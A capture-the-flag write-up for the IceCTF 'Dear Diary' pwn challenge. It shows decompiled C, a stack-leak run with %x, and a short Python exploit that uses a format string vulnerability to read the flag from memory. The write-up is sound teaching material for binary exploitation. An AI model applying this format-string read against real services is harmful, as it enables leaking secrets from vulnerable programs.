# Dear Diary (Pwn, 60)

In the task description we are given the following info:
>We all want to keep our secrets secure and what is more important than our precious diary entries? We made this highly secure diary service that is sure to keep all your boy crushes and edgy poems safe from your parents.

A little bit info about task file:
```
File name : dear_diary  
File type : ELF 32-bit LSB executable  
SHA1      : 34cff95cf188187fe9f2d92d95b97bac128aa459
```

And some `checksec` details:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Tools used:  
>IDA Pro  

Let's go straight to the `main()` and see what's there for us:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice;
  unsigned int entry_id;
  char buffer[5120];
  char choice_data[4];

  ...
  flag(); // interesting
  entry_id = 0;
  puts("-- Diary 3000 --");
  fflush(stdout);
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      fgets(choice_data, 4, stdin);
      choice = atoi(choice_data);
      if ( choice != 2 )
        break;
      if ( entry_id )
        print_entry(&buffer[256 * (entry_id - 1)]); // interesting
      else
        puts("No entry found!");
    }
    if ( choice == 3 )
      break;
    if ( choice == 1 )
    {
      if ( entry_id > 0x13 )
      {
        puts("diary ran out of space..");
        exit(1);
      }
      add_entry(&buffer[256 * entry_id++]); // interesting
    }
    else
    {
      puts("Invalid input.");
    }
  }
  exit(0);
}
```

We can see here that `flag()` function is called right at the start.
Then a menu is printed and some action taken according to the choice.  
Let's dig deeper and see what each of those marked functions do.

```c
int flag()
{
  ...
  fd = open("./flag.txt", 0);
  read(fd, &data, 0x100u);
  ...
}
```

Ok, nothing really special here, as it only opens the `./flag.txt` file and reads its content to a buffer at `.bss:0804A0A0 data`  

```c
int __cdecl add_entry(char *a1)
{
  ...
  printf("Tell me all your secrets: ");
  fflush(stdout);
  fgets(a1, 256, stdin);
  if ( strchr(a1, 'n') )
  {
    puts("rude!");
    exit(1);
  }
  ...
}
```

Here it only reads up to 256 bytes from _stdin_ into the buffer passed in argument, and checks if there's an `n` character in the string. First suspicious thing, but let's go further.

```c
int __cdecl print_entry(const char *a1)
{
  ...
  printf(a1);
  fflush(stdout);
  ...
}
```

And there we have it, parameter is directly passed into `printf()` function.  
Nice and clean `format string vulnerability`.

Ok, now it's the time for a short recap.
> There's a buffor allocated on stack that can hold up to 20 entries.  
> Each diary entry is 256 bytes long.  
> Diary entry can't have `n` character in it.  
> We can print out recently added diary entry.  

`strchr(a1, 'n')` in `add_entry()` is there presumably for checking against one of `printf's` writing modifiers `%n`, `%hn`, `%hhn`. Thus we can't use any of them.

Let's run the app and put a custom string with some marker at the beginning, that would print out the stack for us.

```
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: AAAA%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x

1. add entry
2. print latest entry
3. quit
> 2
AAAAb763a64d|b77b1000|bf840088|bf841488|0|a|c2951300|0|0|bf841498|804888c|bf840088|4|b77b1c20|0|0|1|41414141|257c7825|78257c78|7c78257c|257c7825|78257c78
```

Great, `0x41414141` which corresponds to `AAAA` is at `18th` place.
What we need is some way of reading the _flag_ that is stored under buffer `.bss:0804A0A0`.

So, instead of `0x41414141` let's put `0x0804A0A0` and instead of `%x` at `18th` let's put `%s`.

```python
import struct
import socket

data = ''
data += struct.pack( '<I', 0x0804a0a0 )
data += '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s'

s = socket.create_connection( ( 'diary.vuln.icec.tf', 6501 ) )
print s.recv( 256 )
print s.recv( 256 )
s.send( '1\n' )
print s.recv( 256 )
s.send( data + '\n' )
print s.recv( 256 )
s.send( '2\n' )
print repr( s.recv( 256 ) )
```

And that's all, we get the flag `IceCTF{this_thing_is_just_sitting_here}`
